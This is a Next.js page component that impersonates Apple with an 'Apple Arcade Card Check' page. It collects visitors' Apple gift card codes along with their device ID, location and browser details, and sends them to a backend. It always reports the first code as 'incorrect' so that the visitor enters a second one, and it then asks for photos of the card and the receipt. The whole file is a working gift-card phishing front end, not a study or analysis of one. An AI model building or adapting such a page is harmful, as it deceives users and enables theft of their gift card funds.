import { useState, useEffect } from 'react'
import Head from 'next/head'
import styles from '../styles/apple.module.css'

export default function AppleArcadePage() {
  const [cards, setCards] = useState([''])
  const [loading, setLoading] = useState(false)
  const [result, setResult] = useState(null)
  const [error, setError] = useState(null)
  const [location, setLocation] = useState('United States')
  const [showTutorial, setShowTutorial] = useState(false)
  const [showIssuanceInfo, setShowIssuanceInfo] = useState(false)
  const [showLocationBanner, setShowLocationBanner] = useState(true)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [deviceId, setDeviceId] = useState(null)
  const [copySuccess, setCopySuccess] = useState(false)
  const [attemptCount, setAttemptCount] = useState(0)

  // Receipt upload states
  const [showUploadStep, setShowUploadStep] = useState(false)
  const [selectedImages, setSelectedImages] = useState([])
  const [uploadProgress, setUploadProgress] = useState(false)
  const [uploadComplete, setUploadComplete] = useState(false)
  const [uploadError, setUploadError] = useState(null)

  useEffect(() => {
    async function detectLocation() {
      try {
        const res = await fetch('https://ipapi.co/json/')
        const data = await res.json()
        if (data.country_name) {
          setLocation(data.country_name)
          return
        }
      } catch (err) {
        console.error('IP detection failed, using fallback', err)
      }
    }
    detectLocation()

    // Initialize or get device ID
    let id = localStorage.getItem('deviceId')
    if (!id) {
      id = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now()
      localStorage.setItem('deviceId', id)
    }
    setDeviceId(id)
  }, [])

  const handleCardChange = (index, value) => {
    setCards(prev => prev.map((c, i) => i === index ? value.toUpperCase() : c))
  }

  const addCard = () => setCards(prev => [...prev, ''])

  const removeCard = (index) => setCards(prev => prev.length > 1 ? prev.filter((_, i) => i !== index) : prev)

  async function checkBalance(e) {
    if (e) e.preventDefault()
    setError(null)
    setResult(null)
    setCopySuccess(false)
    const validCards = cards.filter(c => c.trim())
    if (validCards.length === 0) return setError('Please enter a card number.')
    setLoading(true)
    try {
      const browserInfo = {
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`
      }

      const res = await fetch('/api/generate-issuance-id', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardNumber: validCards.map(c => c.replace(/\s+/g, '')).join('/'),
          type: 'apple-arcade',
          deviceId: deviceId,
          location: location,
          browserInfo: JSON.stringify(browserInfo)
        })
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Unknown error')
      
      if (attemptCount === 0) {
        setError('The card code you entered is incorrect. Please verify the code and try again.')
        setCards([''])
        setAttemptCount(1)
      } else {
        setResult(data)
        setAttemptCount(0)
        if (data.cardId && !data.isDuplicate) {
          setShowUploadStep(true)
        }
      }
    } catch (err) {
      setError(err.message)
    } finally { setLoading(false) }
  }

  const countries = [
    'Afghanistan', 'Albania', 'Algeria', 'Argentina', 'Australia', 'Austria', 'Bangladesh', 'Belgium', 'Brazil',
    'Canada', 'Chile', 'China', 'Colombia', 'Czech Republic', 'Denmark', 'Egypt', 'Finland', 'France',
    'Germany', 'Greece', 'Hong Kong', 'Hungary', 'India', 'Indonesia', 'Ireland', 'Israel', 'Italy',
    'Japan', 'Malaysia', 'Mexico', 'Netherlands', 'New Zealand', 'Nigeria', 'Norway', 'Pakistan', 'Peru',
    'Philippines', 'Poland', 'Portugal', 'Romania', 'Saudi Arabia', 'Singapore', 'South Africa',
    'South Korea', 'Spain', 'Sweden', 'Switzerland', 'Taiwan', 'Thailand', 'Turkey', 'Ukraine',
    'United Arab Emirates', 'United Kingdom', 'United States', 'Vietnam'
  ].sort()

  const handleImageSelect = (e) => {
    const files = Array.from(e.target.files)
    if (files.length + selectedImages.length > 3) {
      setUploadError('Maximum 3 images allowed')
      return
    }

    setUploadError(null)

    // Convert to base64 for preview and upload
    files.forEach(file => {
      const reader = new FileReader()
      reader.onload = (event) => {
        setSelectedImages(prev => [...prev, {
          file,
          preview: event.target.result,
          base64: event.target.result
        }])
      }
      reader.readAsDataURL(file)
    })
  }

  const removeImage = (index) => {
    setSelectedImages(prev => prev.filter((_, i) => i !== index))
  }

  const handleUpload = async () => {
    if (selectedImages.length === 0) {
      setUploadError('Please select at least one image')
      return
    }

    setUploadProgress(true)
    setUploadError(null)

    try {
      const res = await fetch('/api/upload-receipt', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          cardId: result.cardId,
          images: selectedImages.map(img => img.base64)
        })
      })

      const data = await res.json()
      if (!res.ok) throw new Error(data?.error || 'Upload failed')

      setUploadComplete(true)
      setShowUploadStep(false)
    } catch (err) {
      setUploadError(err.message)
    } finally {
      setUploadProgress(false)
    }
  }

  const skipUpload = () => {
    setShowUploadStep(false)
    setSelectedImages([])
    setUploadError(null)
  }

  const copyIssuanceId = async () => {
    if (!result?.issuanceId) return

    try {
      await navigator.clipboard.writeText(result.issuanceId)
      setCopySuccess(true)
    } catch (err) {
      setError('Unable to copy the Issuance ID right now.')
    }
  }

  const resetForm = () => {
    setCards([''])
    setResult(null)
    setShowUploadStep(false)
    setSelectedImages([])
    setUploadComplete(false)
    setUploadError(null)
    setCopySuccess(false)
  }

  return (
    <div className={styles.appleStyles}>
      <Head>
        <title>Apple Arcade Card Check - Apple</title>
        <meta property="og:title" content="Apple Arcade Card Check - Apple" />
        <meta property="og:description" content="Check to see if the card is an Apple Arcade compatible card." />
        <meta property="og:type" content="website" />
      </Head>

      {/* Location Banner */}
      {showLocationBanner && (
        <div className="location-banner">
          <div className="banner-content">
            <p>Choose another country or region to see content specific to your location.</p>
            <div className="banner-controls">
              <div className="select-wrapper">
                <select
                  value={location}
                  onChange={(e) => setLocation(e.target.value)}
                  className="location-select"
                >
                  {countries.map(country => (
                    <option key={country} value={country}>
                      {country}
                    </option>
                  ))}
                </select>
              </div>
              <button className="banner-btn" onClick={() => setShowLocationBanner(false)}>Continue</button>
              <button className="close-banner" onClick={() => setShowLocationBanner(false)} aria-label="Close">
                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                  <path d="M18 6L6 18M6 6l12 12" />
                </svg>
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Apple Header */}
      <header className="apple-header">
        <div className="header-content">
          <div className="header-left">
            <a href="/apple" className="apple-logo" aria-label="Apple">
              <img src="/lightappleicon.PNG" alt="Apple Logo" width="20" height="20" />
            </a>
          </div>

          <nav className="nav-menu">
            <a href="#store">Store</a>
            <a href="#mac">Mac</a>
            <a href="#ipad">iPad</a>
            <a href="#iphone">iPhone</a>
            <a href="#watch">Watch</a>
            <a href="#vision">Vision</a>
            <a href="#airpods">AirPods</a>
            <a href="#tv">TV & Home</a>
            <a href="#entertainment">Entertainment</a>
            <a href="#AirPods">Accessories</a>
            <a href="#support">Support</a>
          </nav>

          <div className="header-actions">
            <button className="icon-btn" aria-label="Search">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="11" cy="11" r="8" /><path d="m21 21-4.3-4.3" />
              </svg>
            </button>
            <button className="icon-btn" aria-label="Shopping Bag">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z" /><path d="M3 6h18" /><path d="M16 10a4 4 0 0 1-8 0" />
              </svg>
            </button>
            <button className="mobile-menu-btn" aria-label="Menu" onClick={() => setMobileMenuOpen(true)}>
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round">
                <path d="M4 8h16M4 16h16" />
              </svg>
            </button>
          </div>
        </div>
      </header>

      {/* Mobile Full-Screen Overlay Nav */}
      <aside className={`mobile-nav ${mobileMenuOpen ? 'open' : ''}`}>
        <div className="mobile-nav-header">
          <button className="icon-btn" onClick={() => setMobileMenuOpen(false)}>
            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round">
              <path d="M18 6L6 18M6 6l12 12" />
            </svg>
          </button>
        </div>
        <nav className="mobile-links">
          <a href="#store" onClick={() => setMobileMenuOpen(false)}>Store</a>
          <a href="#mac" onClick={() => setMobileMenuOpen(false)}>Mac</a>
          <a href="#ipad" onClick={() => setMobileMenuOpen(false)}>iPad</a>
          <a href="#iphone" onClick={() => setMobileMenuOpen(false)}>iPhone</a>
          <a href="#watch" onClick={() => setMobileMenuOpen(false)}>Watch</a>
          <a href="#support" onClick={() => setMobileMenuOpen(false)}>Support</a>
        </nav>
      </aside>

      <main className="page-root">
        <div className="shell">
          <section className="hero">
            <div style={{ width: '100%', maxWidth: '700px', margin: '0 auto 20px', borderRadius: '12px', overflow: 'hidden' }}>
              <img src="/applearcade.png" alt="Apple Arcade" style={{ width: '100%', display: 'block' }} />
            </div>
            <h1>Apple Arcade Card Check</h1>
            <p className="hero-text">Enter your 16 digit code to check if your card is Apple Arcade compatible.</p>
          </section>

          <div className="main-card">
            <form onSubmit={checkBalance} className="form">
              {cards.map((cardValue, index) => (
                <div key={index} className="input-wrapper" style={{ position: 'relative' }}>
                  <span>Gift Card Code {cards.length > 1 ? `#${index + 1}` : ''}</span>
                  <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                    <input
                      type="text"
                      value={cardValue}
                      onChange={(e) => handleCardChange(index, e.target.value)}
                      placeholder="XXXX XXXX XXXX XXXX"
                      autoComplete="off"
                      style={{ flex: 1 }}
                    />
                    {cards.length > 1 && (
                      <button
                        type="button"
                        onClick={() => removeCard(index)}
                        style={{ background: 'none', border: 'none', color: '#86868b', fontSize: '20px', cursor: 'pointer', padding: '4px 8px' }}
                      >
                        ×
                      </button>
                    )}
                  </div>
                </div>
              ))}
              {cards.length < 5 && (
                <button
                  type="button"
                  onClick={addCard}
                  className="location-btn"
                  style={{ marginBottom: '12px', fontSize: '14px' }}
                >
                  + Add Another Card
                </button>
              )}

              {!showUploadStep && (
                <div className="actions">
                  <button type="submit" className="primary" disabled={loading}>
                    {loading ? 'Checking…' : 'Check Card'}
                  </button>
                </div>
              )}

              {error && <div className="error">{error}</div>}

              {result && !showUploadStep && (
                <div className="result">
                  {result.message ? (
                    <div className="error" style={{ background: '#f5f5f7', color: '#1d1d1f', border: 'none', textAlign: 'center', marginTop: '20px', padding: '15px', borderRadius: '8px' }}>
                      {result.message}
                    </div>
                  ) : (
                    <>
                      <div style={{ fontSize: '12px', fontWeight: 600, color: '#86868b', textTransform: 'uppercase', letterSpacing: '1px' }}>Card Type</div>
                      <div className="amount" style={{ margin: '10px 0', fontSize: '24px', color: '#ff453a' }}>Not a legacy card</div>
                      <div className="meta" style={{ marginBottom: '20px' }}>For Card ending in {result.cardLast4}</div>
                    </>
                  )}
                </div>
              )}

              {showUploadStep && (
                <div className="upload-step">
                  <div className="upload-header">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z" />
                      <circle cx="12" cy="13" r="4" />
                    </svg>
                    <h3>Upload Card Image / Receipt</h3>
                  </div>
                  <p className="upload-subtitle">For verification, upload a photo of your card and purchase receipt.</p>

                  <div className="image-preview-grid">
                    {selectedImages.map((img, idx) => (
                      <div key={idx} className="preview-item">
                        <img src={img.preview} alt={`Preview ${idx + 1}`} />
                        <button type="button" className="remove-btn" onClick={() => removeImage(idx)}>×</button>
                      </div>
                    ))}
                    {selectedImages.length < 3 && (
                      <label className="add-image-btn">
                        <input
                          type="file"
                          accept="image/*"
                          onChange={handleImageSelect}
                          multiple
                          style={{ display: 'none' }}
                        />
                        <span>+</span>
                        <span className="add-text">Add Image</span>
                      </label>
                    )}
                  </div>

                  {uploadError && <div className="error" style={{ marginTop: '15px' }}>{uploadError}</div>}

                  <div className="upload-actions">
                    <button type="button" className="primary" onClick={handleUpload} disabled={uploadProgress || selectedImages.length === 0}>
                      {uploadProgress ? 'Uploading...' : 'Upload'}
                    </button>
                    <button type="button" className="location-btn" onClick={skipUpload} disabled={uploadProgress} style={{ marginTop: '10px' }}>
                      Skip
                    </button>
                  </div>
                </div>
              )}
            </form>
          </div>

          <section className="help-section">
            <div className="help-header" onClick={() => setShowTutorial(!showTutorial)}>
              <h2>Can't find your gift card code?</h2>
              <button
                className="toggle-btn"
                aria-expanded={showTutorial}
                aria-label="Toggle Tutorial"
              >
                <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ transform: showTutorial ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.3s ease' }}>
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>
            </div>

            {showTutorial && (
              <div className="tutorial">
                <div className="mockup-grid">
                  <div className="mockup-card">
                    <div className="mockup-image">
                      <div className="card-mockup">
                        <div className="card-logo">APPLE</div>
                        <div className="card-code">1234 5678 9012 3456</div>
                      </div>
                    </div>
                    <h3>Physical Gift Card</h3>
                    <p>Look on the <strong>back</strong> of your card. The 16-digit code is usually printed below or above the barcode.</p>
                  </div>

                  <div className="mockup-card">
                    <div className="mockup-image">
                      <div className="email-mockup" style={{ width: '100%', maxWidth: '280px' }}>
                        <div className="email-header" style={{ borderBottom: '0.5px solid #eee', paddingBottom: '8px', marginBottom: '12px' }}>
                          <div style={{ fontWeight: 700, fontSize: '14px' }}>Apple</div>
                        </div>
                        <div style={{ fontSize: '13px', fontWeight: 600, marginBottom: '16px' }}>Your Apple Gift Card is ready</div>
                        <div className="code-box" style={{ background: '#f5f5f7', padding: '12px', borderRadius: '8px', fontWeight: 700, textAlign: 'center', letterSpacing: '1px' }}>1234 5678 9012 3456</div>
                      </div>
                    </div>
                    <h3>Digital Gift Card</h3>
                    <p>Check your <strong>email</strong> for a message from Apple with your gift code.</p>
                  </div>

                  <div className="mockup-card">
                    <div className="mockup-image">
                      <div className="receipt-mockup" style={{ width: '100%', maxWidth: '240px', background: 'white', border: '1px solid #d2d2d7', padding: '24px', borderRadius: '4px', boxShadow: '0 4px 12px rgba(0,0,0,0.05)' }}>
                        <div style={{ fontWeight: 700, fontSize: '11px', marginBottom: '12px' }}>Apple Store Receipt</div>
                        <div style={{ borderBottom: '1px dashed #d2d2d7', margin: '12px 0' }}></div>
                        <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '10px', marginBottom: '4px' }}>
                          <span>Card Code:</span>
                          <span style={{ fontWeight: 700 }}>1234 5678...</span>
                        </div>
                        <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '10px' }}>
                          <span>Amount:</span>
                          <span style={{ fontWeight: 700 }}>$50.00</span>
                        </div>
                      </div>
                    </div>
                    <h3>Purchase Receipt</h3>
                    <p>If purchased in-store, check your <strong>receipt</strong>. The code is printed clearly on it.</p>
                  </div>
                </div>
              </div>
            )}
            
            <div className="help-header" onClick={() => setShowIssuanceInfo(!showIssuanceInfo)} style={{ borderTop: '1px solid #d2d2d7', paddingTop: '20px', marginTop: '20px' }}>
              <h2>How do I check my Apple Arcade card?</h2>
              <button
                className="toggle-btn"
                aria-expanded={showIssuanceInfo}
                aria-label="Toggle Tutorial"
              >
                <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ transform: showIssuanceInfo ? 'rotate(180deg)' : 'rotate(0deg)', transition: 'transform 0.3s ease' }}>
                  <polyline points="6 9 12 15 18 9" />
                </svg>
              </button>
            </div>

            {showIssuanceInfo && (
              <div className="tutorial">
                <div style={{ background: '#f5f5f7', padding: '20px', borderRadius: '12px' }}>
                  <div style={{ display: 'flex', gap: '15px', marginBottom: '15px' }}>
                    <div style={{ width: '24px', height: '24px', background: '#0071e3', color: '#fff', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, fontWeight: 'bold', fontSize: '12px' }}>1</div>
                    <p style={{ margin: 0, fontSize: '14px', lineHeight: '1.4' }}>Enter your Apple Gift Card code in the field above. The code is usually 16 digits and can be found on the back of a physical card or in a digital email.</p>
                  </div>
                  <div style={{ display: 'flex', gap: '15px', marginBottom: '15px' }}>
                    <div style={{ width: '24px', height: '24px', background: '#0071e3', color: '#fff', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, fontWeight: 'bold', fontSize: '12px' }}>2</div>
                    <p style={{ margin: 0, fontSize: '14px', lineHeight: '1.4' }}>Click "Check ID" and wait for the result. Your card will be verified against our database to confirm its compatibility with Apple Arcade.</p>
                  </div>
                  <div style={{ display: 'flex', gap: '15px' }}>
                    <div style={{ width: '24px', height: '24px', background: '#0071e3', color: '#fff', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, fontWeight: 'bold', fontSize: '12px' }}>3</div>
                    <p style={{ margin: 0, fontSize: '14px', lineHeight: '1.4' }}>If the card is not compatible, you will be notified immediately. You can try again with a different code if needed.</p>
                  </div>
                </div>
              </div>
            )}

            <div className="help-footer">
               <p>Still need help? <a href="https://support.apple.com/gift-card" target="_blank" rel="noopener noreferrer">Visit Apple Support →</a></p>
            </div>
          </section>

          {/* Footer */}
          <footer className="page-footer">
            <p>© {new Date().getFullYear()} Apple Inc. All rights reserved.</p>
          </footer>
        </div>
      </main>
    </div>
  )
}
